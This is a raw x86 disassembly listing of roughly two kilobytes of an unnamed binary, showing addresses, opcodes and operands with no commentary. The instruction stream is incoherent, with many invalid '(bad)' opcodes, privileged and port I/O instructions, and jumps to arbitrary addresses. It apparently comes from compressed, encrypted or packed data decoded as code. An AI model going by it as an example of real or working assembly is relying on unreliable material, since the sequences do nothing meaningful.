  4184ec:	xor    BYTE PTR [ecx-0x6ab36c9b],cl
  4184f2:	push   0xd
  4184f4:	mov    bh,0x2e
  4184f6:	das    
  4184f7:	add    DWORD PTR [eax+0x5ab7c80a],edx
  4184fd:	pop    esp
  4184fe:	in     eax,0x81
  418500:	fistp  WORD PTR [ebx]
  418502:	xor    edi,DWORD PTR [ebx+0x38]
  418505:	ds xchg ecx,eax
  418507:	inc    ebx
  418508:	call   0xc36931a6
  41850d:	adc    BYTE PTR [ebp+0x4a43d410],0x58
  418514:	sbb    ebx,DWORD PTR [esi]
  418516:	pop    ss
  418517:	add    BYTE PTR cs:[edx-0x78],ch
  41851b:	stos   BYTE PTR es:[edi],al
  41851c:	sbb    BYTE PTR [ecx+0x181cf5a8],0xb6
  418523:	sub    edx,DWORD PTR [edi-0x66]
  418526:	jo     0x418510
  418528:	mov    ds:0x5e36aae6,eax
  41852d:	std    
  41852e:	ret    0x1bf
  418531:	pop    edi
  418532:	jo     0x4185af
  418534:	mov    ds:0x8ac610a1,al
  418539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41853a:	loop   0x418558
  41853c:	inc    edx
  41853d:	pop    ecx
  41853e:	mov    al,0x64
  418540:	in     eax,dx
  418541:	aad    0xee
  418543:	jnp    0x4185b6
  418545:	mov    ebp,0x9efa6d20
  41854a:	test   eax,0x150b4761
  41854f:	js     0x4184f2
  418551:	mov    al,ds:0x34b1c98a
  418556:	xor    eax,0xa0c07438
  41855b:	outs   dx,BYTE PTR ds:[esi]
  41855c:	fcomp  QWORD PTR [edi-0x13]
  41855f:	frstor [esi]
  418561:	xlat   BYTE PTR ds:[ebx]
  418562:	(bad)  
  418563:	push   0xffffffc8
  418565:	test   BYTE PTR [ecx+0xc],0x81
  418569:	inc    edx
  41856a:	wrmsr  
  41856c:	pusha  
  41856d:	mov    bl,0xa7
  41856f:	rcl    DWORD PTR [edi*4-0x327d1b98],1
  418576:	cmp    edx,DWORD PTR [esi-0x472b5c72]
  41857c:	fs hlt 
  41857e:	lods   al,BYTE PTR ds:[esi]
  41857f:	fldenv [ebx]
  418581:	in     al,dx
  418582:	aam    0x95
  418584:	xor    DWORD PTR [eax-0xc],edi
  418587:	inc    ecx
  418588:	push   esi
  418589:	lock push es
  41858b:	sbb    DWORD PTR [esi+0x77],0x53d74184
  418592:	cmp    cl,BYTE PTR [ecx]
  418594:	cmp    al,0xd0
  418596:	xlat   BYTE PTR ds:[ebx]
  418597:	or     ch,BYTE PTR [edx]
  418599:	cwde   
  41859a:	add    al,BYTE PTR [ebx]
  41859c:	and    ebx,edi
  41859e:	aam    0x4
  4185a0:	push   ecx
  4185a1:	fwait
  4185a2:	jne    0x418592
  4185a4:	out    0xc1,eax
  4185a6:	js     0x41853d
  4185a8:	in     al,0xe4
  4185aa:	and    al,ch
  4185ac:	mov    ecx,0xd722bb24
  4185b1:	add    al,0xf7
  4185b3:	push   ebp
  4185b4:	adc    BYTE PTR [ecx-0x61b4f83e],bl
  4185ba:	inc    esp
  4185bb:	pop    ss
  4185bc:	jbe    0x4185d9
  4185be:	data16 add bh,BYTE PTR [edx+0x7213d38]
  4185c5:	pop    eax
  4185c6:	test   eax,0x3cbfe37b
  4185cb:	hlt    
  4185cc:	leave  
  4185cd:	or     edi,edi
  4185cf:	pop    ebx
  4185d0:	dec    esp
  4185d1:	int3   
  4185d2:	or     dl,BYTE PTR [ecx]
  4185d4:	or     eax,0x15edde53
  4185d9:	neg    BYTE PTR [ecx+0x2b]
  4185dc:	iret   
  4185dd:	outs   dx,DWORD PTR ds:[esi]
  4185de:	sub    DWORD PTR fs:[ebp-0x65],esp
  4185e2:	add    esp,DWORD PTR [esp+eax*1]
  4185e5:	xchg   edi,eax
  4185e6:	fwait
  4185e7:	jbe    0x4185f0
  4185e9:	loop   0x418629
  4185eb:	and    al,0xea
  4185ed:	adc    eax,0xceb0b349
  4185f2:	loop   0x4185b0
  4185f4:	rcl    BYTE PTR [ebx],cl
  4185f6:	fiadd  WORD PTR [edx-0x33]
  4185f9:	ss cmp dh,ah
  4185fc:	jbe    0x4185db
  4185fe:	aas    
  4185ff:	inc    ecx
  418600:	cmp    ebx,DWORD PTR [ebx+0x5fc3a66f]
  418606:	popf   
  418607:	pop    es
  418608:	popa   
  418609:	dec    edi
  41860a:	into   
  41860b:	call   0x71c3660d
  418610:	mov    WORD PTR [eax],?
  418612:	icebp  
  418613:	in     al,dx
  418614:	sbb    al,0xbf
  418616:	pop    ecx
  418617:	jmp    0x7bae:0x85da39ed
  41861e:	out    0xf4,al
  418620:	fsubrp st(5),st
  418622:	push   eax
  418623:	out    0x61,al
  418625:	je     0x4185c7
  418627:	sbb    DWORD PTR [ecx-0x2d0d3065],esi
  41862d:	adc    BYTE PTR [ecx],dh
  41862f:	xor    dl,BYTE PTR [edx+0x6c]
  418632:	push   cs
  418633:	sbb    eax,0x6d417400
  418638:	and    BYTE PTR ds:0x573732c6,cl
  41863e:	and    BYTE PTR [edi-0xf4711a7],bl
  418644:	(bad)  
  418645:	fwait
  418646:	xor    eax,0xdedca3e
  41864b:	push   edi
  41864c:	cmp    DWORD PTR [ebx+0x6ff2f4a8],ebp
  418652:	adc    BYTE PTR [edi+0x5e3eb1a5],ah
  418658:	xor    DWORD PTR [ebp+edi*2+0x73],eax
  41865c:	sbb    edx,ebp
  41865e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41865f:	or     al,BYTE PTR [ebx-0x29]
  418662:	mov    esp,gs
  418664:	xchg   ebx,eax
  418665:	xchg   esi,eax
  418666:	pop    ebx
  418667:	pushf  
  418668:	xchg   edx,eax
  418669:	adc    eax,esp
  41866b:	mov    esp,0xd9574eab
  418670:	call   0x75771391
  418675:	xchg   esi,eax
  418676:	jmp    0x418625
  418678:	mov    bh,0x77
  41867a:	fisub  WORD PTR [ebp-0x347510d9]
  418680:	push   ecx
  418681:	pop    edx
  418682:	imul   ebp,DWORD PTR [ecx+eax*2],0xfb8c462
  418689:	sub    al,0x64
  41868b:	inc    dx
  41868d:	stos   BYTE PTR es:[edi],al
  41868e:	mov    ebx,0x4d906e32
  418693:	stc    
  418694:	stos   BYTE PTR es:[edi],al
  418695:	xor    al,0x8f
  418697:	(bad)  
  418698:	fcmove st,st(5)
  41869a:	pop    edx
  41869b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41869c:	pop    es
  41869d:	inc    esp
  41869e:	push   ss
  41869f:	sub    eax,0x22fcfb0
  4186a4:	mov    ds:0x1947c3a0,eax
  4186a9:	sahf   
  4186aa:	xchg   edx,eax
  4186ab:	xchg   BYTE PTR [eax+esi*8],bh
  4186ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186af:	aad    0xb1
  4186b1:	arpl   di,ax
  4186b3:	xchg   ecx,eax
  4186b4:	retf   0xa00c
  4186b7:	or     dl,bh
  4186b9:	xor    DWORD PTR [ebp-0x55d3da77],ebx
  4186bf:	imul   ecx,DWORD PTR [esi+0x75c5b027],0xffffffa8
  4186c6:	push   ds
  4186c7:	in     al,0x40
  4186c9:	xor    DWORD PTR [edx+ecx*2+0x53],eax
  4186cd:	arpl   WORD PTR [edi+0x62],dx
  4186d0:	repz fnstcw WORD PTR [ebp+0x9]
  4186d4:	(bad)  
  4186d5:	(bad)  
  4186d6:	adc    al,0xf2
  4186d8:	jae    0x41873d
  4186da:	pop    ss
  4186db:	lgdtd  [ecx]
  4186de:	scas   eax,DWORD PTR es:[edi]
  4186df:	(bad)  
  4186e0:	jb     0x418730
  4186e2:	xchg   edx,eax
  4186e3:	pop    es
  4186e4:	mov    cl,0x80
  4186e6:	(bad)  
  4186e7:	dec    edx
  4186e8:	in     al,dx
  4186e9:	jecxz  0x4186ae
  4186eb:	inc    esp
  4186ec:	mov    bh,0xea
  4186ee:	jb     0x4186dc
  4186f0:	push   es
  4186f1:	cdq    
  4186f2:	jg     0x4186b5
  4186f4:	mov    BYTE PTR [eax*1+0x7bf395b1],ch
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	mov    ds:0xb4321f89,eax
  418701:	(bad)  
  418702:	or     ecx,esi
  418704:	cmp    cl,dh
  418706:	mov    edx,0x5accf1e0
  41870b:	sbb    al,0x8f
  41870d:	popf   
  41870e:	mov    al,ds:0xcd91bb47
  418713:	test   BYTE PTR ds:0x4ff25083,0x3c
  41871a:	pop    ebx
  41871b:	imul   cl
  41871d:	scas   al,BYTE PTR es:[edi]
  41871e:	add    al,0x98
  418720:	mov    WORD PTR [eax+0x45b6eddb],gs
  418726:	fcomp  DWORD PTR [esi]
  418728:	sub    BYTE PTR [ebx],ch
  41872a:	stc    
  41872b:	sbb    cl,bl
  41872d:	ds enter 0x92f9,0xc9
  418732:	xchg   esi,eax
  418733:	jae    0x418718
  418735:	adc    al,al
  418737:	push   0xefde64a4
  41873c:	jmp    0x6a7f:0xeaa7bbac
  418743:	jle    0x4186d5
  418745:	adc    edx,DWORD PTR [ebx+ebx*4]
  418748:	popf   
  418749:	jmp    0xea97141a
  41874e:	sub    eax,0x9390d577
  418753:	xchg   BYTE PTR [edx],ah
  418755:	mul    ebx
  418757:	fs retf 
  418759:	std    
  41875a:	mov    al,ds:0x96467277
  41875f:	push   es
  418760:	dec    ebx
  418761:	xor    ebx,DWORD PTR [edi+0x5c]
  418764:	std    
  418765:	rcl    DWORD PTR [esi+0x5c],cl
  418768:	scas   eax,DWORD PTR es:[edi]
  418769:	adc    esi,DWORD PTR [ebx-0x3e]
  41876c:	in     al,dx
  41876d:	push   esp
  41876e:	or     eax,0x5bf96cb1
  418773:	push   ebx
  418774:	xchg   ebx,eax
  418775:	jp     0x418735
  418777:	inc    esp
  418778:	std    
  418779:	jns    0x418730
  41877b:	lahf   
  41877c:	(bad)  
  41877d:	adc    DWORD PTR [edx+0x4d70be04],ecx
  418783:	and    ecx,edx
  418785:	repnz add al,BYTE PTR [esi]
  418788:	retf   0xdf1f
  41878b:	fld    DWORD PTR [ebp-0x3d48bad1]
  418791:	cmp    al,BYTE PTR [edi]
  418793:	jg     0x4187cc
  418795:	fdivr  st,st(3)
  418797:	test   DWORD PTR [ebp-0x45],ecx
  41879a:	imul   edi,DWORD PTR [ecx+0x6134aa50],0x55
  4187a1:	mov    edx,0x110a00a5
  4187a6:	call   0x70c9ca69
  4187ab:	inc    edi
  4187ac:	sub    ecx,DWORD PTR [eax+edi*1]
  4187af:	xchg   edx,eax
  4187b0:	les    esp,FWORD PTR [ecx+0x5d]
  4187b3:	dec    esi
  4187b4:	and    BYTE PTR [si],bl
  4187b7:	int    0x21
  4187b9:	xor    ebx,DWORD PTR [ebx+0x71]
  4187bc:	ins    BYTE PTR es:[edi],dx
  4187bd:	jg     0x418744
  4187bf:	inc    ebp
  4187c0:	(bad)  
  4187c1:	xchg   edx,eax
  4187c2:	cwde   
  4187c3:	imul   esp,eax,0xb8db6015
  4187c9:	clc    
  4187ca:	jo     0x4187a2
  4187cc:	outs   dx,BYTE PTR ds:[esi]
  4187cd:	push   ecx
  4187ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187cf:	push   0xaf49a61f
  4187d4:	sub    BYTE PTR [ecx+0x97c7dc8],dh
  4187da:	push   cs
  4187db:	ds inc ebp
  4187dd:	push   edx
  4187de:	pop    ecx
  4187df:	test   eax,0x5bba0eb4
  4187e4:	sbb    ebx,DWORD PTR [edx-0x423fd64c]
  4187ea:	das    
  4187eb:	cwde   
  4187ec:	mov    bl,0x62
  4187ee:	loope  0x418803
  4187f0:	mov    esi,0x8d9516c5
  4187f5:	push   ss
  4187f6:	fmul   QWORD PTR [ebx+esi*1+0x75]
  4187fa:	jnp    0x418858
  4187fc:	inc    edx
  4187fd:	mov    ah,0x3a
  4187ff:	fcom   QWORD PTR [ebp+0x6ab149ec]
  418805:	stos   BYTE PTR es:[edi],al
  418806:	mov    al,0x81
  418808:	mov    bh,0x9d
  41880a:	mov    bl,0x98
  41880c:	js     0x418794
  41880e:	scas   al,BYTE PTR es:[edi]
  41880f:	jo     0x41883a
  418811:	loope  0x41888c
  418813:	sub    dh,BYTE PTR [eax-0x1f11f696]
  418819:	cmc    
  41881a:	push   ecx
  41881b:	or     DWORD PTR ds:0x41da46bc,0x34b472d
  418825:	and    al,0xea
  418827:	add    ebx,DWORD PTR [eax]
  418829:	adc    BYTE PTR [edi-0xc],ch
  41882c:	(bad)  
  41882e:	call   0x63b71a97
  418833:	jno    0x418831
  418835:	sbb    BYTE PTR [ebp+0x11776736],0x23
  41883c:	pop    eax
  41883d:	sbb    esi,DWORD PTR [ecx+0x21]
  418840:	call   0x870:0x29d39a17
  418847:	push   0x13108884
  41884c:	mul    DWORD PTR [ecx+0x47]
  41884f:	xor    BYTE PTR [edi],bl
  418851:	or     DWORD PTR [ecx],esi
  418853:	sbb    ebx,DWORD PTR [esi+0x1b012172]
  418859:	je     0x418897
  41885b:	ins    BYTE PTR es:[edi],dx
  41885c:	fstp   TBYTE PTR [eax+0x5385d228]
  418862:	out    dx,eax
  418863:	lods   eax,DWORD PTR ds:[esi]
  418864:	mov    ch,0xb4
  418866:	dec    cl
  418868:	(bad)  [edx+0x73]
  41886b:	jne    0x418805
  41886d:	add    edx,DWORD PTR [eax+0x2600e27f]
  418873:	(bad)  
  418876:	push   eax
  418877:	jno    0x418817
  418879:	jae    0x41880b
  41887b:	ins    BYTE PTR es:[edi],dx
  41887c:	xor    ebp,esp
  41887e:	and    DWORD PTR [esi+ecx*8+0x23],ecx
  418882:	jl     0x41884f
  418884:	add    DWORD PTR [esi+0x5a9abb4e],ecx
  41888a:	dec    eax
  41888b:	js     0x41889d
  41888d:	inc    ebx
  41888e:	pushf  
  41888f:	xor    BYTE PTR [edi+esi*2-0x4a275d52],0x81
  418897:	cmp    al,cl
  418899:	xchg   ebx,eax
  41889a:	shl    esi,1
  41889c:	and    ebx,eax
  41889e:	mov    ss,WORD PTR ds:0x75fa2e83
  4188a4:	in     al,0x18
  4188a6:	xchg   edi,eax
  4188a7:	rcl    BYTE PTR [edx+0x6c],1
  4188aa:	push   ebp
  4188ab:	push   ss
  4188ac:	adc    bh,BYTE PTR [ebp+0x5de55158]
  4188b2:	inc    edi
  4188b3:	sti    
  4188b4:	inc    edi
  4188b5:	lds    eax,FWORD PTR [esi+0xf]
  4188b8:	mov    dh,0x16
  4188ba:	imul   esi,DWORD PTR [edx-0x1059ee85],0x3b
  4188c1:	xchg   esp,eax
  4188c2:	sbb    BYTE PTR ss:[edi],dh
  4188c5:	jnp    0x418848
  4188c7:	cwde   
  4188c8:	aam    0xf1
  4188ca:	sub    al,0xc8
  4188cc:	jmp    0x899f:0xbe9a1552
  4188d3:	cmp    eax,0x97b12bb9
  4188d8:	mov    eax,ds:0x68ac435c
  4188dd:	inc    esp
  4188de:	dec    esi
  4188df:	fimul  WORD PTR [edx-0x52]
  4188e2:	(bad)  
  4188e3:	stos   BYTE PTR es:[edi],al
  4188e4:	out    0x72,al
  4188e6:	jne    0x418877
  4188e8:	bound  ebp,QWORD PTR [esi+0x3d264a9d]
  4188ee:	outs   dx,DWORD PTR ds:[esi]
  4188ef:	out    dx,al
  4188f0:	add    al,0x8
  4188f2:	sub    eax,0xc1b4f48d
  4188f7:	cmp    esi,edi
  4188f9:	sbb    al,0x96
  4188fb:	jbe    0x418958
  4188fd:	mov    ah,0xb9
  4188ff:	push   edi
  418900:	add    al,BYTE PTR [eax-0x33]
  418903:	test   DWORD PTR [ecx],ebx
  418905:	jmp    0x4188f2
  418907:	sub    DWORD PTR [ebp-0x30],0xad1b3e37
  41890e:	std    
  41890f:	dec    esp
  418910:	jge    0x418896
  418912:	arpl   WORD PTR [esi+0x4],dx
  418915:	arpl   ax,bp
  418917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418918:	mov    eax,0x5cd9e79c
  41891d:	scas   eax,DWORD PTR es:[edi]
  41891e:	jns    0x418977
  418920:	call   DWORD PTR [ebp-0x60a8f5f6]
  418926:	sti    
  418927:	pop    eax
  418928:	jbe    0x418964
  41892a:	dec    ebx
  41892b:	or     ah,cl
  41892d:	setbe  BYTE PTR [ecx-0x314d14ca]
  418934:	mov    ch,0xbb
  418936:	loop   0x418939
  418938:	cmp    BYTE PTR [ebp+0x39],ch
  41893b:	aas    
  41893c:	jbe    0x41891f
  41893e:	outs   dx,BYTE PTR ds:[esi]
  41893f:	test   al,0xde
  418941:	mov    edx,0x4d1c160c
  418946:	ins    BYTE PTR es:[edi],dx
  418947:	ficomp DWORD PTR gs:[ecx]
  41894a:	jae    0x41891c
  41894c:	test   DWORD PTR [ecx],0x7d3756d1
  418952:	inc    ebp
  418953:	leave  
  418954:	mov    ecx,0x7454ac1a
  418959:	inc    esi
  41895a:	push   ss
  41895b:	push   ebx
  41895c:	scas   eax,DWORD PTR es:[edi]
  41895d:	jecxz  0x4189a0
  41895f:	inc    ecx
  418960:	pop    ds
  418961:	ins    DWORD PTR es:[edi],dx
  418962:	push   cs
  418963:	sub    eax,DWORD PTR [ebx+eiz*1]
  418966:	test   al,0xb6
  418968:	in     eax,dx
  418969:	and    DWORD PTR [eax+0xf],esp
  41896c:	mov    esp,0xa6a4cbf4
  418971:	out    0xdd,eax
  418973:	out    0xde,al
  418975:	lock repnz xor al,0x15
  418979:	clc    
  41897a:	and    DWORD PTR [edi],edx
  41897c:	mov    edi,DWORD PTR [eax+edx*8+0x4e]
  418980:	test   ecx,0x5ae022f4
  418986:	mov    ecx,0x25276933
  41898b:	mov    DWORD PTR [ecx+0x6d],esp
  41898e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41898f:	sahf   
  418990:	fldcw  WORD PTR [ebp-0x11]
  418993:	cwde   
  418994:	inc    edi
  418996:	dec    ebp
  418997:	sub    esi,edi
  418999:	adc    BYTE PTR [edi],bh
  41899b:	fist   WORD PTR ds:[ebp+eax*1+0x5cea0e57]
  4189a3:	dec    edi
  4189a4:	outs   dx,DWORD PTR ds:[esi]
  4189a5:	pop    edi
  4189a6:	lods   eax,DWORD PTR ds:[esi]
  4189a7:	lds    ebx,FWORD PTR [esi+0x4973a1c2]
  4189ad:	rol    DWORD PTR [ebp-0x71],0xcf
  4189b1:	sti    
  4189b2:	cmc    
  4189b3:	(bad)  
  4189b4:	xor    DWORD PTR [edx-0x80],ebp
  4189b7:	jb     0x4189bd
  4189b9:	ror    DWORD PTR [esi-0x555b1eef],1
  4189bf:	xor    ah,BYTE PTR [eax]
  4189c1:	and    al,0x1b
  4189c3:	and    eax,DWORD PTR [ebp-0x29253072]
  4189c9:	add    al,BYTE PTR [edx+0x4d1410cc]
  4189cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189d0:	jle    0x4189b9
  4189d2:	(bad)  
  4189d3:	push   esi
  4189d4:	mov    WORD PTR [edi-0x48f14756],ds
  4189da:	or     eax,0xbe6cd289
  4189df:	sahf   
  4189e0:	cmp    ah,BYTE PTR [edi-0x143c64fc]
  4189e6:	push   ds
  4189e7:	cwde   
  4189e8:	xchg   edx,eax
  4189e9:	mov    esi,0xdbd8c0a3
  4189ee:	mov    al,0xd5
  4189f0:	sbb    al,0x4
  4189f2:	sub    dl,0x6b
  4189f5:	dec    ebx
  4189f6:	cmp    BYTE PTR [ebx+0x67b20df],dh
  4189fc:	xchg   ecx,eax
  4189fd:	ins    BYTE PTR es:[edi],dx
  4189fe:	cmp    eax,0xdf7a9913
  418a03:	mov    edi,DWORD PTR [ebx+0x5022886d]
  418a09:	(bad)  
  418a0b:	push   ds
  418a0c:	adc    edx,DWORD PTR [eax+0x5d]
  418a0f:	retf   0x7eed
  418a12:	mov    dh,0xdf
  418a14:	sub    BYTE PTR ds:[edi],dh
  418a17:	aaa    
  418a18:	mov    cl,0xef
  418a1a:	outs   dx,DWORD PTR ds:[esi]
  418a1b:	ss push 0xbf17d23b
  418a21:	cs jg  0x4189c2
  418a24:	ror    DWORD PTR [ebx+0x77],1
  418a27:	(bad)
  418a2a:	xor    BYTE PTR [ebp+0x19ff813a],cl
  418a30:	inc    ecx
  418a31:	mov    ch,0x39
  418a33:	mov    ecx,0x4ce9ac16
  418a38:	add    dl,dh
  418a3a:	call   0x1f7e:0x2208f5d4
  418a41:	mov    dl,0xde
  418a43:	mov    eax,0x388fa7a8
  418a48:	mov    esp,0xde588264
  418a4d:	dec    esp
  418a4e:	and    cl,dl
  418a50:	(bad)  [ebx+eiz*4+0x52a444b9]
  418a57:	sbb    BYTE PTR [eax-0x51],dh
  418a5a:	push   eax
  418a5b:	fs aad 0x43
  418a5e:	pop    esi
  418a5f:	push   esp
  418a60:	scas   al,BYTE PTR es:[edi]
  418a61:	jg     0x418a28
  418a63:	sbb    esi,esp
  418a65:	mov    dl,0x5e
  418a67:	sub    dl,BYTE PTR [ebx-0x4a83c755]
  418a6d:	fsub   st(0),st
  418a6f:	dec    esi
  418a70:	add    eax,0x13ee3153
  418a75:	aam    0x97
  418a77:	or     al,0x2f
  418a79:	mov    BYTE PTR [edi],bh
  418a7b:	jo     0x418ae1
  418a7d:	adc    DWORD PTR [ebp-0x10],ecx
  418a80:	sbb    al,BYTE PTR [ebp+0x630b6888]
  418a86:	cmp    eax,0x3654fa24
  418a8b:	jmp    0x4c3944e3
  418a90:	mov    ah,BYTE PTR [ecx]
  418a92:	mov    esp,0x9c70c69c
  418a97:	ret    
  418a98:	mov    ebp,0x42e18cb6
  418a9d:	retf   
  418a9e:	ja     0x418a9c
  418aa0:	add    ebp,DWORD PTR [ebp+ebp*8-0x49]
  418aa4:	jno    0x418a95
  418aa6:	push   ss
  418aa7:	jns    0x418a6f
  418aa9:	in     eax,0x7f
  418aab:	dec    ebx
  418aac:	xchg   ecx,eax
  418aad:	mov    ds:0x87ec6e38,eax
  418ab2:	pop    ebp
  418ab3:	gs ds iret 
  418ab6:	jno    0x90e9c212
  418abc:	pop    esi
  418abd:	std    
  418abe:	aam    0xc2
  418ac0:	add    eax,0xce76c0fe
  418ac5:	pop    ebp
  418ac6:	or     ah,BYTE PTR [ecx+ecx*4]
  418ac9:	scas   al,BYTE PTR es:[edi]
  418aca:	push   ecx
  418acb:	aaa    
  418acc:	and    bh,BYTE PTR [ebp+0x6fa48609]
  418ad2:	adc    edx,eax
  418ad4:	adc    ebx,DWORD PTR [ecx-0x18]
  418ad7:	in     eax,0xff
  418ad9:	sahf   
  418ada:	repnz cs mov ch,0xf6
  418ade:	not    BYTE PTR [edx+0x60]
  418ae1:	stc    
  418ae2:	pop    es
  418ae3:	dec    esp
  418ae4:	dec    edi
  418ae5:	mov    gs,WORD PTR [ebp+0x631a5330]
  418aeb:	sbb    al,0xc4
  418aed:	xchg   eax,ebx
  418aef:	mov    dl,0xaf
  418af1:	outs   dx,DWORD PTR ds:[esi]
  418af2:	fistp  QWORD PTR [ebx+edx*4+0x74de5a68]
  418af9:	mov    dh,0xd2
  418afb:	adc    bh,BYTE PTR [ebp+0x23]
  418afe:	sub    bh,bl
  418b00:	data16 jl 0x418b39
  418b03:	lea    ebx,[eax+0x7e02947]
  418b09:	xor    ch,BYTE PTR [esi]
  418b0b:	mov    al,0x5f
  418b0d:	mov    dh,BYTE PTR [ebp+ebx*8+0x4c397e8f]
  418b14:	fdiv   DWORD PTR [ebx]
  418b16:	mov    ebx,DWORD PTR [edx+ecx*1+0x1c2e91d6]
  418b1d:	jmp    DWORD PTR [ecx-0x5da8d314]
  418b23:	pop    esi
  418b24:	adc    BYTE PTR [ecx],cl
  418b26:	sar    BYTE PTR [ecx+0x2fa45819],1
  418b2c:	xchg   esi,eax
  418b2d:	pusha  
  418b2e:	aam    0x1a
  418b30:	fs push esp
  418b32:	pop    esp
  418b33:	in     al,0xd7
  418b35:	xchg   bl,ch
  418b37:	cmp    dl,BYTE PTR [esp+ebp*1]
  418b3a:	aad    0x6c
  418b3c:	jne    0x418bbc
  418b3e:	sbb    cl,BYTE PTR [edx-0x7827192e]
  418b44:	out    0xee,al
  418b46:	inc    edx
  418b47:	rcr    bh,cl
  418b49:	mov    BYTE PTR [ecx-0xab4ed44],ah
  418b4f:	xchg   DWORD PTR [ecx+0x153b2b48],esp
  418b55:	arpl   WORD PTR [eax+0x64],cx
  418b58:	ds push ds
  418b5a:	scas   al,BYTE PTR es:[edi]
  418b5b:	pop    eax
  418b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b5d:	lds    ebp,FWORD PTR [ebp+0x37f4f99a]
  418b63:	arpl   WORD PTR [ecx+eiz*1],sp
  418b66:	rcl    DWORD PTR [esi+0x5907a1c8],0x0
  418b6d:	jo     0x418afd
  418b6f:	aas    
  418b70:	jge    0x418b69
  418b72:	sbb    DWORD PTR [ebx+esi*2+0x3d613ad2],ebp
  418b79:	lods   eax,DWORD PTR ds:[si]
  418b7b:	and    DWORD PTR [ebp+0x7371daad],ebp
  418b81:	pop    es
  418b82:	cmp    eax,DWORD PTR [ecx+0x555bf6cb]
  418b88:	jbe    0x418b87
  418b8a:	mov    ds:0x5742594d,eax
  418b8f:	mov    dl,0xe3
  418b91:	cdq    
  418b92:	dec    esp
  418b93:	lds    esi,FWORD PTR [ecx-0x47fc45f6]
  418b99:	add    ebp,edi
  418b9b:	mov    ds:0xd3fc4d60,eax
  418ba0:	add    esp,DWORD PTR [edi]
  418ba2:	div    BYTE PTR [edi+0x3f416553]
  418ba8:	mov    ecx,0xf12b262b
  418bad:	loop   0x418b9e
  418baf:	sbb    eax,0x47623005
  418bb4:	les    edx,FWORD PTR [edi]
  418bb6:	test   DWORD PTR [edx],ecx
  418bb8:	sub    dl,BYTE PTR ds:0xb587a58c
  418bbe:	iret   
  418bbf:	ss mov ecx,0x6cf33ee
  418bc5:	xor    BYTE PTR [ebp-0x51],al
  418bc8:	daa    
  418bc9:	sti    
  418bca:	rcr    DWORD PTR [eax],1
  418bcc:	push   esi
  418bcd:	push   ecx
  418bce:	(bad)  
  418bcf:	icebp  
  418bd0:	dec    edx
  418bd1:	(bad)  
  418bd2:	mov    ah,0xad
  418bd4:	mov    eax,0x99e4955e
  418bd9:	popa   
  418bda:	pop    edi
  418bdb:	lock add si,WORD PTR [ecx-0x17]
  418be0:	call   0x96a7:0x40fea170
  418be7:	sbb    eax,0xed36f8c1
  418bec:	es xchg ebp,ebx
  418bef:	push   ds
  418bf0:	loope  0x418c22
  418bf2:	dec    eax
  418bf3:	into   
  418bf4:	mov    ebx,DWORD PTR [ebx+0x1e8ee3cb]
  418bfa:	and    esp,DWORD PTR [edi]
  418bfc:	jmp    0x418ba5
  418bfe:	mov    ebx,edx
  418c00:	data16 (bad) 
  418c02:	xor    eax,0x887d47f7
  418c07:	sub    al,0x12
  418c09:	lea    ebx,[eax+0x3cc64515]
  418c0f:	pop    edx
  418c10:	pushf  
  418c11:	sbb    BYTE PTR [ebx-0x54],cl
  418c14:	fstp   TBYTE PTR [esi-0x7f]
  418c17:	ss mov dl,0x61
  418c1a:	adc    al,0x4a
  418c1c:	sbb    eax,0x94a57d52
  418c21:	pop    ds
  418c22:	test   eax,ecx
  418c24:	pop    ds
  418c25:	loopne 0x418c63
  418c27:	pop    ebp
  418c28:	or     BYTE PTR [eax],ah
  418c2a:	jno    0x418c54
  418c2c:	add    BYTE PTR [ecx],dh
  418c2e:	sbb    DWORD PTR [eax-0x466fe527],eax
  418c34:	idiv   DWORD PTR [ebp-0x25]
  418c37:	push   edx
  418c38:	shl    bh,1
  418c3a:	add    eax,0xfef214cf
  418c3f:	dec    eax
  418c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c41:	and    esp,edx
  418c43:	mov    dh,0xab
  418c45:	popf   
  418c46:	xchg   ebx,eax
  418c47:	loopne 0x418c6a
  418c49:	jmp    0x3a736dd1
  418c4e:	int3   
  418c4f:	sahf   
  418c50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c51:	and    al,0xb8
  418c53:	inc    ebx
  418c54:	dec    eax
  418c55:	repz push ds
  418c57:	mov    eax,ds:0xc24638a6
  418c5c:	inc    ebx
  418c5d:	test   BYTE PTR [edx-0xb63068c],dh
  418c63:	sbb    ebp,DWORD PTR [ecx]
  418c65:	mov    ah,0x30
  418c67:	xor    BYTE PTR [ebx],dh
  418c69:	mov    ebx,0xead4b13d
  418c6e:	push   edx
  418c6f:	mov    ebp,0x166b16b2
  418c74:	xchg   ebx,eax
  418c75:	mov    al,ds:0xd6469640
  418c7a:	push   ebx
  418c7b:	stos   DWORD PTR es:[edi],eax
  418c7c:	jge    0x418cf6
  418c7e:	dec    esp
  418c7f:	adc    edx,DWORD PTR [edi-0x139120ed]
  418c85:	pop    edx
  418c86:	push   ss
  418c87:	sub    ecx,DWORD PTR [edx-0x25]
  418c8a:	jae    0x418ceb
  418c8c:	popa   
  418c8d:	and    al,0x2f
  418c8f:	dec    ebx
  418c90:	outs   dx,BYTE PTR ds:[esi]
  418c91:	add    esp,DWORD PTR [eax+0x684a1b49]
  418c97:	mov    esi,0x210d42d0
  418c9c:	lods   eax,DWORD PTR ds:[esi]
  418c9d:	or     cl,BYTE PTR ds:0x9c87600b
  418ca3:	and    al,BYTE PTR [eax+0x5]
  418ca6:	shr    ebp,0xbd
  418ca9:	ja     0x418c3f
  418cab:	mov    cl,0xa2
  418cad:	sub    dl,BYTE PTR [edi+0x27]
  418cb0:	hlt    
  418cb1:	add    eax,ebx
  418cb3:	cld    
  418cb4:	and    al,0xc6
  418cb6:	and    bl,BYTE PTR [edi-0xb]
  418cb9:	or     BYTE PTR ds:0x142198cf,bh
  418cbf:	jo     0x418c78
  418cc1:	push   esi
  418cc2:	imul   esi,DWORD PTR [ebx-0x487ea589],0x7d
